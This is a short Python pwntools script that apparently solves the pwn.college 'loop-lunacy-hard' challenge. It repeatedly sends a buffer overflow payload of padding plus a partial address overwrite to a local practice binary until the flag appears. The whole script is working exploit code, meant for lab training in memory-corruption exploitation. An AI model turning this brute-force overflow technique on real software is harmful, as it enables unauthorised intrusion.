from pwn import *

while True:
    p = process('/challenge/loop-lunacy-hard')

    output = p.recvuntil(b"Payload size:").decode()

    p.sendline(b'122')

    payload = b'A' * 100 + b'\x77' + b'\x4f\x1d'

    p.recvuntil('Send your payload')

    p.send(payload)

    str = p.recvall(1)
    if str.find(b'pwn.college{') != -1:
        print(str)
        break
